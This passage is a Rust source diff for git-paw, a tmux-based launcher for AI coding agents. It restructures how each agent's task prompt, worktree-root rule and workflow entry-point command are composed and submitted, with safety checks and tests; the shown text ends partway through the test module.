@@ -351,88 +351,88 @@ fn reattach_active_session_or_refuse(session_name: &str) -> Result<(), PawError>
     tmux::attach(session_name)
 }
 
-/// Builds the per-agent task prompt that gets appended to the supervisor-mode
-/// boot block before injection via `tmux send-keys`.
+/// An agent's rendered task prompt: the prose its first message carries, and
+/// — when the spec format declares one — the workflow entry point submitted
+/// as its own composer line once the pane goes idle.
 ///
-/// **Per-backend dispatch.** When `spec_entry` is `Some`, the helper switches
-/// on `SpecEntry.backend` to pick the prompt shape. Every branch first points
-/// the agent at the gitignored sidecar
+/// The entry point is deliberately NOT part of `prose`. A command embedded in
+/// a prose paragraph is a command a weaker model may narrate instead of
+/// invoke (GP-54); submitted alone it is what a paste-aware CLI parses as a
+/// slash-command invocation.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct TaskPrompt {
+    /// The assignment prose appended to the boot block.
+    pub(crate) prose: String,
+    /// The single command line to submit after `prose`, when declared.
+    pub(crate) entry_point: Option<String>,
+}
+
+/// Renders the task prompt for an agent's spec assignment (or the no-spec
+/// fallback when its branch has none).
+///
+/// Pure: both templates come from
+/// [`git_paw::task_prompts::templates_for`] — the one exhaustive
+/// [`SpecBackendKind`](git_paw::specs::SpecBackendKind) match over the
+/// bundled per-backend assets — and this only substitutes
+/// `{{SIDECAR_REL_PATH}}` and `{{SPEC_ID}}` into them. No command name is
+/// written here; a backend that declares no entry-point template yields
+/// `entry_point: None` and its launch types no second line.
+///
+/// Every template points the agent at the gitignored sidecar
 /// ([`SIDECAR_REL_PATH`](git_paw::agents::SIDECAR_REL_PATH)) — the combined
 /// view of the project's `AGENTS.md` plus the agent's assignment and
-/// coordination rules — before its apply/begin step:
-///
-/// - `SpecBackendKind::OpenSpec` → read the sidecar, then run the
-///   `/opsx:apply <id>` slash command. (Pre-`agents-md-sidecar-injection`
-///   this branch was the bare slash command with deliberately *no* pointer,
-///   because the combined view was auto-loaded from the worktree-root
-///   `AGENTS.md`. The sidecar is no longer auto-loaded by the CLIs, so the
-///   pointer is now required for the agent to receive its assignment and
-///   inter-agent rules. This intentionally overrides that earlier
-///   no-pointer decision.)
-/// - `SpecBackendKind::Markdown` → read the sidecar (which carries the full
-///   spec body), then locate sibling artifacts under `openspec/changes/<id>/`.
-/// - `SpecBackendKind::SpecKit` → read the sidecar only. Unlike `Markdown`,
-///   the Spec Kit decomposition (`speckit::build_prompt`) already embeds the
-///   feature spec, implementation plan, and task phase inline, so there is
-///   no `openspec/changes/<id>/` (or any other) sibling directory to point
-///   at — naming one would send the agent down a path that does not exist
-///   under Spec Kit (speckit-spec-path-pointer).
-///
-/// The match SHALL be exhaustive over `SpecBackendKind` (no `_ =>`
-/// catch-all); the Rust compiler forces a decision for any new variant.
-///
-/// The returned string points the agent at the sidecar rather than embedding
-/// any portion of the spec body. The combined view is written to the sidecar
-/// by `setup_worktree_agents_md`; the supported CLIs only auto-load the
-/// worktree-root `AGENTS.md`, so the prompt is what directs the agent to the
-/// sidecar's combined content. Pointing at a file avoids the paste-buffer trap
-/// and duplicate content.
+/// coordination rules — rather than embedding any portion of the spec body,
+/// which would both duplicate content and risk the paste-buffer trap. The
+/// `Markdown` template additionally names the sibling-artifact directory
+/// `openspec/changes/<id>/`; `SpecKit` and `Superpowers` name none, since
+/// their sidecar already carries the full assignment inline
+/// (speckit-spec-path-pointer).
 ///
 /// **Prerequisite:** callers SHALL ensure `setup_worktree_agents_md` has run
 /// for the worktree before the resulting prompt is injected. The prompt's
 /// guidance is non-actionable if the sidecar is missing.
-///
-/// When a spec is associated with the branch, `OpenSpec` and `Markdown`
-/// entries embed the spec ID so the agent can locate sibling artifacts
-/// (proposal, design, specs, tasks) under `openspec/changes/<id>/`; `SpecKit`
-/// and `Superpowers` entries need no such pointer since their sidecar
-/// already carries the full assignment. When no spec is associated, the
-/// prompt is the default fallback that points only at the sidecar.
-/// Bundled per-backend templates for [`build_task_prompt`], carrying the
-/// `{{SIDECAR_REL_PATH}}` placeholder and, where the backend needs it, the
-/// `{{SPEC_ID}}` placeholder.
-const TASK_PROMPT_NO_SPEC: &str = include_str!("../assets/boot-task-prompts/no-spec.md");
-const TASK_PROMPT_OPENSPEC: &str = include_str!("../assets/boot-task-prompts/openspec.md");
-const TASK_PROMPT_MARKDOWN: &str = include_str!("../assets/boot-task-prompts/markdown.md");
-const TASK_PROMPT_SPECKIT: &str = include_str!("../assets/boot-task-prompts/speckit.md");
-const TASK_PROMPT_SUPERPOWERS: &str = include_str!("../assets/boot-task-prompts/superpowers.md");
-
-pub(crate) fn build_task_prompt(spec_entry: Option<&git_paw::specs::SpecEntry>) -> String {
+pub(crate) fn build_task_prompt(spec_entry: Option<&git_paw::specs::SpecEntry>) -> TaskPrompt {
     use git_paw::agents::SIDECAR_REL_PATH;
-    use git_paw::specs::SpecBackendKind;
-    match spec_entry {
-        Some(s) => {
-            let template = match s.backend {
-                SpecBackendKind::OpenSpec => TASK_PROMPT_OPENSPEC,
-                SpecBackendKind::Markdown => TASK_PROMPT_MARKDOWN,
-                SpecBackendKind::SpecKit => TASK_PROMPT_SPECKIT,
-                SpecBackendKind::Superpowers => TASK_PROMPT_SUPERPOWERS,
-            };
-            template
-                .replace("{{SIDECAR_REL_PATH}}", SIDECAR_REL_PATH)
-                .replace("{{SPEC_ID}}", &s.id)
-        }
-        None => TASK_PROMPT_NO_SPEC.replace("{{SIDECAR_REL_PATH}}", SIDECAR_REL_PATH),
+    let templates = git_paw::task_prompts::templates_for(spec_entry.map(|s| s.backend));
+    let spec_id = spec_entry.map_or("", |s| s.id.as_str());
+    let render = |template: &str| {
+        template
+            .replace("{{SIDECAR_REL_PATH}}", SIDECAR_REL_PATH)
+            .replace("{{SPEC_ID}}", spec_id)
+    };
+    TaskPrompt {
+        prose: render(templates.prose),
+        entry_point: templates.entry_point.map(render),
     }
 }
 
-/// Combines a boot block with the agent's task prompt into the single string
-/// submitted to its pane. Shared by [`attach_agent`] (the supervisor and
-/// `add` paths) and `commands::start::cmd_start_with_specs` so a spec-driven
-/// launch's prompt is byte-identical to the supervisor path's for the same
-/// branch, broker config, and spec entry (`start-spec-launch-parity`).
-pub(crate) fn combine_boot_and_task_prompt(boot_block: &str, task_prompt: &str) -> String {
-    format!("{boot_block}\n\n{task_prompt}")
+/// The bundled worktree rule every launch prompt ends with, carrying the
+/// `{{WORKTREE_ROOT}}` placeholder.
+const WORKTREE_ROOT_RULE: &str = include_str!("../assets/worktree-root-rule.md");
+
+/// Composes the single prompt git-paw injects into one agent pane at launch:
+/// the boot block (when the broker is enabled), the task prompt's prose (when
+/// the agent has an assignment), and — always, last — the worktree rule
+/// naming `worktree_root`, joined by blank lines.
+///
+/// Every injecting path goes through here (the bare pre-fill with no prose,
+/// spec-driven and supervised `start`, and `git paw add`), so a spec-driven
+/// launch's prompt stays byte-identical to the supervisor path's for the same
+/// branch, broker config and spec entry (`start-spec-launch-parity`) and no
+/// path can forget the rule. The rule is placed last for recency: it is the
+/// constraint the agent must still be holding when it starts editing
+/// (`boot-block`, "Launch prompts name the agent's worktree root").
+pub(crate) fn compose_launch_prompt(
+    boot_block: Option<&str>,
+    prose: Option<&str>,
+    worktree_root: &Path,
+) -> String {
+    let rule = WORKTREE_ROOT_RULE.replace("{{WORKTREE_ROOT}}", &worktree_root.to_string_lossy());
+    let mut parts: Vec<&str> = Vec::with_capacity(3);
+    parts.extend(boot_block);
+    parts.extend(prose);
+    parts.push(&rule);
+    parts.join("\n\n")
 }
 
 /// Per-session context for [`attach_agent`] — the values shared across every
@@ -487,8 +487,12 @@ struct AttachContext<'a> {
 struct AttachedAgent {
     /// Pane spec (branch, worktree path, CLI command) for the tmux layout.
     pane: tmux::PaneSpec,
-    /// Combined boot block + initial task prompt to inject into the pane.
+    /// Composed boot block + task prose + worktree rule to inject into the
+    /// pane as its first message.
     prompt: String,
+    /// The workflow entry point to submit as a second composer line once the
+    /// pane goes idle, when this agent's spec format declares one.
+    entry_point: Option<String>,
     /// Session-JSON worktree record for `status` / `stop` / `purge`.
     entry: WorktreeEntry,
 }
@@ -667,12 +671,7 @@ fn attach_agent(
         session_id_args.as_deref(),
     );
 
-    let boot_block = git_paw::skills::build_boot_block(
-        branch,
-        &ctx.broker_config.url(),
-        git_paw::skills::cli_speaks_mcp(ctx.agent_cli, ctx.clis),
-    );
-    let task_prompt = build_task_prompt(spec_entry);
+    let (prompt, entry_point) = compose_agent_launch(ctx, branch, spec_entry, &wt.path);
 
     Ok(AttachedAgent {
         pane: tmux::PaneSpec {
@@ -680,7 +679,8 @@ fn attach_agent(
             worktree: wt_str,
             cli_command,
         },
-        prompt: combine_boot_and_task_prompt(&boot_block, &task_prompt),
+        prompt,
+        entry_point,
         entry: WorktreeEntry {
             branch: branch.to_string(),
             worktree_path: wt.path,
@@ -688,11 +688,36 @@ fn attach_agent(
             branch_created: wt.branch_created,
             base_branch: created_branch_base(ctx.repo_root, wt.branch_created),
             pending_boot_prompt: None,
+            pending_entry_point: None,
             runtime_slot: provisioned.runtime_slot,
             cli_session_id,
             spec_id: spec_entry.map(|s| s.id.clone()),
         },
     })
+}
+
+/// Builds one agent's first message and, when its spec format declares one,
+/// the workflow entry point to submit after it.
+///
+/// Split out of [`attach_agent`] so the pure composition — boot block, task
+/// prose, worktree rule — sits apart from the worktree/hook/pane side effects
+/// around it, and so the supervisor and `add` paths cannot drift from it.
+fn compose_agent_launch(
+    ctx: &AttachContext,
+    branch: &str,
+    spec_entry: Option<&git_paw::specs::SpecEntry>,
+    worktree_root: &Path,
+) -> (String, Option<String>) {
+    let boot_block = git_paw::skills::build_boot_block(
+        branch,
+        &ctx.broker_config.url(),
+        git_paw::skills::cli_speaks_mcp(ctx.agent_cli, ctx.clis),
+    );
+    let task_prompt = build_task_prompt(spec_entry);
+    (
+        compose_launch_prompt(Some(&boot_block), Some(&task_prompt.prose), worktree_root),
+        task_prompt.entry_point,
+    )
 }
 
 /// Gates a pane before boot-block injection via
@@ -764,6 +789,407 @@ fn submit_prompt_to_pane(session_name: &str, pane_idx: usize, prompt: &str, dela
     let _ = std::process::Command::new("tmux")
         .args(["send-keys", "-t", &target, "Enter"])
         .status();
+}
+
+/// One pane still owing its declared workflow entry point.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct PendingEntryPoint {
+    /// The pane the entry point is destined for.
+    pub(crate) pane_index: usize,
+    /// Broker id of the agent in that pane, for the expiry message.
+    pub(crate) agent_id: String,
+    /// The exact line to type — rendered from the backend's bundled template.
+    pub(crate) entry_point: String,
+    /// That CLI's settle delay, used both as the poll interval and between
+    /// the literal send and its `Enter`.
+    pub(crate) settle_delay_ms: u64,
+}
+
+/// How long the launch waits, across all panes at once, for agents to finish
+/// their first turn before giving up on typing their entry points.
+const ENTRY_POINT_BUDGET_MS: u64 = 120_000;
+
+/// The floor on the poll interval, so a CLI configured with a tiny settle
+/// delay does not turn the wait into a `capture-pane` spin.
+const ENTRY_POINT_MIN_POLL_MS: u64 = 250;
+
+/// Consecutive idle captures required before anything is typed. Two, so the
+/// instant between the prompt's `Enter` and the CLI starting its turn — which
+/// reads as idle — cannot be mistaken for a finished turn.
+const ENTRY_POINT_IDLE_CAPTURES: u8 = 2;
+
+/// The pane I/O and clock [`submit_entry_points_with`] needs, so the wait's
+/// decisions are testable over captured fixtures without a live tmux pane.
+trait EntryPointIo {
+    /// The pane's current contents (`tmux capture-pane -p`), or `None` when
+    /// the capture failed.
+    ///
+    /// The distinction matters: a failed `capture-pane` yields an empty
+    /// string, and an empty capture satisfies every idle marker — no prompt,
+    /// no mid-response footer, no input box. Returning `Option` forces the
+    /// caller to treat "I could not look" as "not idle" rather than as the
+    /// strongest possible evidence of idleness.
+    fn capture(&mut self, session: &str, pane_index: usize) -> Option<String>;
+    /// The pane's foreground process name (`#{pane_current_command}`), or
+    /// `None` when it could not be read.
+    fn pane_command(&mut self, session: &str, pane_index: usize) -> Option<String>;
+    /// Type `text` into the pane literally, submitting nothing.
+    fn send_text(&mut self, session: &str, pane_index: usize, text: &str);
+    /// Send one named key (`Enter`).
+    fn send_key(&mut self, session: &str, pane_index: usize, key: &str);
+    /// Wait `ms` milliseconds.
+    fn sleep(&mut self, ms: u64);
+    /// Milliseconds elapsed since the wait began.
+    fn elapsed_ms(&self) -> u64;
+}
+
+/// The live implementation: real `tmux` keystrokes and a real clock.
+struct TmuxEntryPointIo {
+    started: std::time::Instant,
+}
+
+impl TmuxEntryPointIo {
+    fn new() -> Self {
+        Self {
+            started: std::time::Instant::now(),
+        }
+    }
+}
+
+impl EntryPointIo for TmuxEntryPointIo {
+    fn capture(&mut self, session: &str, pane_index: usize) -> Option<String> {
+        let target = format!("{session}:0.{pane_index}");
+        let out = std::process::Command::new("tmux")
+            .args(["capture-pane", "-p", "-t", &target])
+            .output()
+            .ok()?;
+        out.status
+            .success()
+            .then(|| String::from_utf8_lossy(&out.stdout).to_string())
+    }
+
+    fn pane_command(&mut self, session: &str, pane_index: usize) -> Option<String> {
+        let target = format!("{session}:0.{pane_index}");
+        let out = std::process::Command::new("tmux")
+            .args([
+                "display-message",
+                "-p",
+                "-t",
+                &target,
+                "#{pane_current_command}",
+            ])
+            .output()
+            .ok()?;
+        out.status
+            .success()
+            .then(|| String::from_utf8_lossy(&out.stdout).trim().to_string())
+    }
+
+    fn send_text(&mut self, session: &str, pane_index: usize, text: &str) {
+        let target = format!("{session}:0.{pane_index}");
+        let _ = std::process::Command::new("tmux")
+            .args(["send-keys", "-t", &target, "-l", text])
+            .status();
+    }
+
+    fn send_key(&mut self, session: &str, pane_index: usize, key: &str) {
+        let target = format!("{session}:0.{pane_index}");
+        let _ = std::process::Command::new("tmux")
+            .args(["send-keys", "-t", &target, key])
+            .status();
+    }
+
+    fn sleep(&mut self, ms: u64) {
+        std::thread::sleep(std::time::Duration::from_millis(ms));
+    }
+
+    fn elapsed_ms(&self) -> u64 {
+        u64::try_from(self.started.elapsed().as_millis()).unwrap_or(u64::MAX)
+    }
+}
+
+/// Why a pane did not receive (or did not complete) its entry point.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) enum EntryPointFailure {
+    /// The budget elapsed with the pane never idle. Nothing was typed.
+    Expired,
+    /// The pane's foreground process is a shell, not an agent CLI — its own
+    /// CLI exited (GP-03c). Nothing was typed.
+    ShellPane(String),
+    /// The rendered entry point carries characters outside the safe set.
+    /// Nothing was typed, for any pane.
+    UnsafeText,
+    /// The text was typed, but the pane stopped being responsive before the
+    /// `Enter`, which was withheld. The text is sitting in the composer.
+    TypedNotSubmitted,
+}
+
+/// A pane that owes (or half-owes) its entry point, and why.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct EntryPointReport {
+    pub(crate) pane: PendingEntryPoint,
+    pub(crate) failure: EntryPointFailure,
+}
+
+/// The characters a rendered entry point may contain: letters, digits, and
+/// `. _ : / <space> -`.
+///
+/// The rendered text is the backend's template with the spec id substituted,
+/// and a spec id is a change-directory name that nothing validates. A
+/// directory may legally be named with shell metacharacters, and a pane whose
+/// CLI has exited is a shell — so the substituted text is refused outright
+/// rather than relying on the pane check alone to keep it away from a command
+/// interpreter. The set is what a workflow command legitimately needs: a
+/// slash command, a colon-namespaced name, a path-like or dotted id.
+fn entry_point_text_is_safe(text: &str) -> bool {
+    !text.is_empty()
+        && text
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | ':' | '/' | ' ' | '-'))
+}
+
+/// The bounded, all-panes-at-once wait behind [`submit_entry_points`],
+/// parameterised over its pane I/O.
+///
+/// Polls every pane still owing an entry point on one shared interval — so
+/// the launch costs the slowest first turn rather than the sum of them — and
+/// types into a pane only when ALL of the following hold:
+///
+/// 1. the rendered text passes [`entry_point_text_is_safe`];
+/// 2. [`pane_is_idle_and_empty`] holds on [`ENTRY_POINT_IDLE_CAPTURES`]
+///    consecutive successful captures, and once more on a fresh capture taken
+///    immediately before the keystroke (the TOCTOU discipline the drive
+///    loop's `submit_buffered_input` applies);
+/// 3. the pane's foreground process is not a shell. A pane whose CLI exited
+///    looks idle to every capture-based predicate — it has no input box, no
+///    prompt, no mid-response marker — so looking at the pane alone cannot
+///    tell a waiting CLI from a command interpreter. This is NOT the
+///    "unrecognised CLI is treated as idle" rule being walked back: a shell
+///    process is not a CLI whose markers went unrecognised.
+///
+/// The `Enter` is then sent as a separate keystroke after the settle delay —
+/// and the pane is captured once more first. A fork or a tool call can raise
+/// a permission prompt during that delay, and an `Enter` arriving then
+/// answers it. When that happens the `Enter` is withheld and the pane is
+/// reported [`EntryPointFailure::TypedNotSubmitted`].
+///
+/// Returns one report per pane that did not complete, in input order.
+///
+/// [`pane_is_idle_and_empty`]: git_paw::supervisor::drive::pane_is_idle_and_empty
+fn submit_entry_points_with<I: EntryPointIo>(
+    io: &mut I,
+    session: &str,
+    mut pending: Vec<PendingEntryPoint>,
+    budget_ms: u64,
+) -> Vec<EntryPointReport> {
+    use git_paw::supervisor::drive::{pane_is_idle_and_empty, pane_is_responsive};
+
+    // A capture we could not take is not evidence of idleness: an empty
+    // string satisfies every idle marker there is.
+    let looks_idle = |capture: Option<String>| capture.is_some_and(|c| pane_is_idle_and_empty(&c));
+
+    let mut reports: Vec<EntryPointReport> = Vec::new();
+    // Refuse unsafe text before any waiting: it cannot become safe, and the
+    // pane it would be typed into may be a shell.
+    pending.retain(|p| {
+        if entry_point_text_is_safe(&p.entry_point) {
+            return true;
+        }
+        reports.push(EntryPointReport {
+            pane: p.clone(),
+            failure: EntryPointFailure::UnsafeText,
+        });
+        false
+    });
+    if pending.is_empty() {
+        return reports;
+    }
+    // One interval for every pane: at least the slowest CLI's settle delay,
+    // so each pane's first capture lands no sooner than one settle delay
+    // after its prompt's `Enter` and consecutive captures stay that far
+    // apart.
+    let poll_ms = pending
+        .iter()
+        .map(|p| p.settle_delay_ms)
+        .max()
+        .unwrap_or_default()
+        .max(ENTRY_POINT_MIN_POLL_MS);
+    let mut idle_streak = vec![0u8; pending.len()];
+
+    loop {
+        io.sleep(poll_ms);
+        let mut idx = 0;
+        while idx < pending.len() {
+            let pane_index = pending[idx].pane_index;
+            if looks_idle(io.capture(session, pane_index)) {
+                idle_streak[idx] += 1;
+            } else {
+                idle_streak[idx] = 0;
+            }
+            if idle_streak[idx] < ENTRY_POINT_IDLE_CAPTURES {
+                idx += 1;
+                continue;
+            }
+            // Look once more, immediately before typing.
+            if !looks_idle(io.capture(session, pane_index)) {
+                idle_streak[idx] = 0;
+                idx += 1;
+                continue;
+            }
+            // A pane that looks idle may simply have no CLI left in it.
+            //
+            // A process we could not read is not a process we may type into:
+            // `display-message` fails when the pane has vanished or been
+            // respawned since the idle re-check a moment ago, which is
+            // exactly the window where it might now be a shell. Reset the
+            // streak and look again on the next poll rather than typing on
+            // the strength of a failed read; if it never resolves, the budget
+            // reports it.
+            let Some(command) = io.pane_command(session, pane_index) else {
+                idle_streak[idx] = 0;
+                idx += 1;
+                continue;
+            };
+            if git_paw::tmux::is_shell_command(&command) {
+                reports.push(EntryPointReport {
+                    pane: pending.remove(idx),
+                    failure: EntryPointFailure::ShellPane(command),
+                });
+                idle_streak.remove(idx);
+                continue;
+            }
+            let settled = pending[idx].settle_delay_ms;
+            let text = pending[idx].entry_point.clone();
+            io.send_text(session, pane_index, &text);
+            io.sleep(settled);
+            // The settle delay is a window in which a fork or a tool call can
+            // raise a permission prompt. An `Enter` arriving then ANSWERS it,
+            // so look before submitting and withhold the key if anything
+            // changed.
+            let still_ours = io
+                .capture(session, pane_index)
+                .is_some_and(|c| pane_is_responsive(&c));
+            if still_ours {
+                io.send_key(session, pane_index, "Enter");
+                pending.remove(idx);
+                idle_streak.remove(idx);
+            } else {
+                reports.push(EntryPointReport {
+                    pane: pending.remove(idx),
+                    failure: EntryPointFailure::TypedNotSubmitted,
+                });
+                idle_streak.remove(idx);
+            }
+        }
+        if pending.is_empty() || io.elapsed_ms() >= budget_ms {
+            reports.extend(pending.into_iter().map(|pane| EntryPointReport {
+                pane,
+                failure: EntryPointFailure::Expired,
+            }));
+            return reports;
+        }
+    }
+}
+
+/// Submits each pane's declared workflow entry point as its own composer
+/// line, once that pane is idle.
+///
+/// Call this after every agent's first prompt has been submitted. Panes whose
+/// spec format declares no entry point are simply not in `pending`, and are
+/// never waited for. A pane the budget expires on is left untouched and
+/// reported on stderr with the exact line to submit by hand, so an attached
+/// human or an orchestrator reading the launch output can finish the job.
+pub(crate) fn submit_entry_points(session: &str, pending: Vec<PendingEntryPoint>) {
+    if pending.is_empty() {
+        return;
+    }
+    let budget_ms = std::env::var("GIT_PAW_ENTRY_POINT_BUDGET_MS")
+        .ok()
+        .and_then(|v| v.parse().ok())
+        .unwrap_or(ENTRY_POINT_BUDGET_MS);
+    // Say so before blocking. This wait runs before the attach (or the
+    // `Added '<branch>'` line), so without this the terminal goes silent for
+    // up to the whole budget while an agent finishes its first turn, and a
+    // user has no way to tell a slow launch from a hung one.
+    println!(
+        "Waiting for {} agent(s) to go idle before submitting their workflow command \
+         (up to {})...",
+        pending.len(),
+        format_budget(budget_ms)
+    );
+    let reports =
+        submit_entry_points_with(&mut TmuxEntryPointIo::new(), session, pending, budget_ms);
+    for report in reports {
+        eprintln!("{}", entry_point_expiry_notice(&report, budget_ms));
+    }
+}
+
+/// The stderr line reporting a pane that did not get (or did not complete)
+/// its entry point.
+///
+/// Every variant names the pane, the agent and the EXACT command
+/// (`boot-block`, "A declared workflow entry point is submitted as its own
+/// composer line", rule 4): an attached human types it, and an orchestrator
+/// reading the launch output has everything it needs to finish the job. What
+/// differs is the reason and therefore the remedy — a withheld `Enter` leaves
+/// the text already in the composer, so re-typing it would double it.
+/// Split out of [`submit_entry_points`] so the contract is testable without
+/// capturing a subprocess's stderr.
+fn entry_point_expiry_notice(report: &EntryPointReport, budget_ms: u64) -> String {
+    let pane = &report.pane;
+    let (reason, remedy) = match &report.failure {
+        EntryPointFailure::Expired => (
+            format!("did not go idle within {}", format_budget(budget_ms)),
+            format!(
+                "once the agent is idle, submit: {}",
+                pane.entry_point.as_str()
+            ),
+        ),
+        EntryPointFailure::ShellPane(command) => (
+            format!("is running a shell ({command}), not an agent CLI — its CLI exited"),
+            format!(
+                "restart the agent, then submit: {}",
+                pane.entry_point.as_str()
+            ),
+        ),
+        EntryPointFailure::UnsafeText => (
+            "has a workflow command carrying characters that are unsafe to type".to_string(),
+            format!(
+                // Debug-escaped, not raw: this text came from a directory
+                // name nothing validates, and printing it raw would let
+                // control or ANSI sequences in that name reach the operator's
+                // terminal — moving the cursor, clearing the screen, or
+                // rewriting the warning that is reporting it.
+                "check the spec id, then submit by hand if it is sound: {:?}",
+                pane.entry_point.as_str()
+            ),
+        ),
+        EntryPointFailure::TypedNotSubmitted => (
+            "stopped responding between the typed command and its Enter, which was \
+             withheld so it could not answer a prompt"
+                .to_string(),
+            format!(
+                "the command is already in the composer — do NOT retype it; once the pane \
+                 is clear, press Enter to submit: {}",
+                pane.entry_point.as_str()
+            ),
+        ),
+    };
+    format!(
+        "warning: pane {} ({}) {reason}, so its workflow command was not submitted; {remedy}",
+        pane.pane_index, pane.agent_id,
+    )
+}
+
+/// Renders a budget for a human: whole seconds, or milliseconds below one
+/// second. Integer-dividing by 1000 would report a test's 800 ms override as
+/// "0s", which reads as "it never waited".
+fn format_budget(budget_ms: u64) -> String {
+    if budget_ms >= 1000 {
+        format!("{}s", budget_ms / 1000)
+    } else {
+        format!("{budget_ms}ms")
+    }
 }
 
 /// Writes the per-repo discovery file (`<repo>/.git-paw/sessions/<name>.json`)
@@ -1833,6 +2259,7 @@ mod tests {
                     branch_created: false,
                     base_branch: None,
                     pending_boot_prompt: None,
+                    pending_entry_point: None,
                     runtime_slot: None,
                     cli_session_id: None,
                     spec_id: spec_id.map(str::to_string),
@@ -1935,32 +2362,552 @@ mod tests {
             prompt: String::new(),
             owned_files: None,
         };
+        let openspec = build_task_prompt(Some(&mk(SpecBackendKind::OpenSpec)));
         assert_eq!(
-            build_task_prompt(Some(&mk(SpecBackendKind::OpenSpec))),
+            openspec.prose,
             "Read .git-paw/AGENTS.local.md first — it carries your assignment and \
-             coordination rules — then run /opsx:apply my-change."
+             coordination rules. Your workflow command follows as the next message; run it \
+             once you have read the sidecar."
         );
         assert_eq!(
-            build_task_prompt(Some(&mk(SpecBackendKind::Markdown))),
+            openspec.entry_point.as_deref(),
+            Some("/opsx:apply my-change")
+        );
+        assert_eq!(
+            build_task_prompt(Some(&mk(SpecBackendKind::Markdown))).prose,
             "Begin your assigned task. Read .git-paw/AGENTS.local.md first — it carries the \
              project rules, your full spec, and your assignment. Additional artifacts \
              (proposal, design, specs, tasks) live under openspec/changes/my-change/ — read \
              them all before starting."
         );
         assert_eq!(
-            build_task_prompt(Some(&mk(SpecBackendKind::SpecKit))),
+            build_task_prompt(Some(&mk(SpecBackendKind::SpecKit))).prose,
             "Begin your assigned task. Read .git-paw/AGENTS.local.md first — it already \
              carries the project rules and your full Spec Kit assignment (feature \
              spec, implementation plan, and task phase) embedded inline; no other \
              artifact directory is needed to start."
         );
         assert_eq!(
-            build_task_prompt(Some(&mk(SpecBackendKind::Superpowers))),
+            build_task_prompt(Some(&mk(SpecBackendKind::Superpowers))).prose,
             "Begin your assigned task. Read .git-paw/AGENTS.local.md first — it carries the \
              project rules and your full superpowers plan (goal, tasks, exact file \
              paths, and per-step verification commands). Work the steps in order and \
              flip `- [ ]` to `- [x]` in the plan as each one lands."
         );
+    }
+
+    /// Maps to `supervisor-launch` scenario "Launch flow sends one Enter per
+    /// submitted line": only a backend with an apply workflow declares an
+    /// entry point, so only its pane is ever typed into twice.
+    #[test]
+    fn only_the_openspec_backend_declares_an_entry_point() {
+        use git_paw::specs::{SpecBackendKind, SpecEntry};
+        let mk = |backend: SpecBackendKind| SpecEntry {
+            id: "my-change".to_string(),
+            backend,
+            branch: "feat/my-change".to_string(),
+            cli: None,
+            prompt: String::new(),
+            owned_files: None,
+        };
+        for backend in [
+            SpecBackendKind::Markdown,
+            SpecBackendKind::SpecKit,
+            SpecBackendKind::Superpowers,
+        ] {
+            assert_eq!(
+                build_task_prompt(Some(&mk(backend))).entry_point,
+                None,
+                "{backend:?} has no apply workflow and must declare no entry point"
+            );
+        }
+        assert_eq!(
+            build_task_prompt(None).entry_point,
+            None,
+            "an agent with no spec has no workflow to enter"
+        );
+    }
+
+    // -----------------------------------------------------------------------
+    // compose_launch_prompt — the single composition every injecting launch
+    // path goes through (`boot-block`, "Launch prompts name the agent's
+    // worktree root")
+    // -----------------------------------------------------------------------
+
+    fn worktree_root() -> std::path::PathBuf {
+        std::path::PathBuf::from("/repo/.git-paw/worktrees/feat-x")
+    }
+
+    /// Maps to `supervisor-launch` scenario "The composed prompt ends with
+    /// the worktree rule".
+    #[test]
+    fn composed_prompt_is_boot_then_prose_then_the_rule_on_blank_lines() {
+        let composed = compose_launch_prompt(Some("BOOT"), Some("PROSE"), &worktree_root());
+        let (head, rule) = composed
+            .split_once("\n\nYour worktree root is ")
+            .expect("the rule is the last blank-line-separated part; got:\n{composed}");
+        assert_eq!(head, "BOOT\n\nPROSE");
+        assert!(
+            rule.starts_with("/repo/.git-paw/worktrees/feat-x."),
+            "the rule names the agent's absolute worktree root; got: {rule}"
+        );
+    }
+
+    /// Maps to `boot-block` scenario "A child worktree's prompt names its
+    /// absolute root": the rule states the confinement, including `../`.
+    #[test]
+    fn the_worktree_rule_forbids_climbing_out_of_the_root() {
+        let composed = compose_launch_prompt(None, Some("PROSE"), &worktree_root());
+        assert!(
+            composed.contains("/repo/.git-paw/worktrees/feat-x"),
+            "got:\n{composed}"
+        );
+        assert!(composed.contains("../"), "got:\n{composed}");
+        assert!(
+            composed.ends_with(')') || composed.ends_with('.'),
+            "the rule is last, so the prompt ends with its final sentence; got:\n{composed}"
+        );
+    }
+
+    /// Maps to `boot-block` scenario "Boot block pre-filled without Enter":
+    /// the bare pre-fill has no task prose, so the rule follows the boot
+    /// block directly — with no empty paragraph where the prose would be.
+    #[test]
+    fn the_bare_pre_fill_joins_boot_block_straight_to_the_rule() {
+        let composed = compose_launch_prompt(Some("BOOT"), None, &worktree_root());
+        assert!(
+            composed.starts_with("BOOT\n\nYour worktree root is "),
+            "got:\n{composed}"
+        );
+        assert!(
+            !composed.contains("\n\n\n"),
+            "no blank part may be joined in; got:\n{composed}"
+        );
+    }
+
+    /// A broker-less spec-driven launch injects no boot block; the prose and
+    /// the rule still compose cleanly.
+    #[test]
+    fn a_missing_boot_block_leaves_prose_then_rule() {
+        let composed = compose_launch_prompt(None, Some("PROSE"), &worktree_root());
+        assert!(
+            composed.starts_with("PROSE\n\nYour worktree root is "),
+            "got:\n{composed}"
+        );
+    }
+
+    // -----------------------------------------------------------------------
+    // submit_entry_points_with — the bounded idle wait before a declared
+    // workflow entry point is typed (`boot-block`, "A declared workflow entry
+    // point is submitted as its own composer line")
+    // -----------------------------------------------------------------------
+
+    /// A scripted pane capturer and virtual clock. Each pane's script is
+    /// consumed one capture at a time; the final entry repeats forever, so a
+    /// fixture that never goes idle simply runs the budget out.
+    struct FakeEntryPointIo {
+        scripts: std::collections::HashMap<usize, Vec<String>>,
+        taken: std::collections::HashMap<usize, usize>,
+        /// Per-pane `#{pane_current_command}`; absent panes report a CLI.
+        commands: std::collections::HashMap<usize, String>,
+        /// Every keystroke, in order, as `(pane, "text:…" | "key:…")`.
+        sent: Vec<(usize, String)>,
+        elapsed: u64,
+    }
+
+    /// The sentinel a script entry uses to mean "this capture FAILED" — not
+    /// "the pane was empty". The two are opposites for the idle decision.
+    const CAPTURE_FAILED: &str = "<<capture-failed>>";
+
+    impl FakeEntryPointIo {
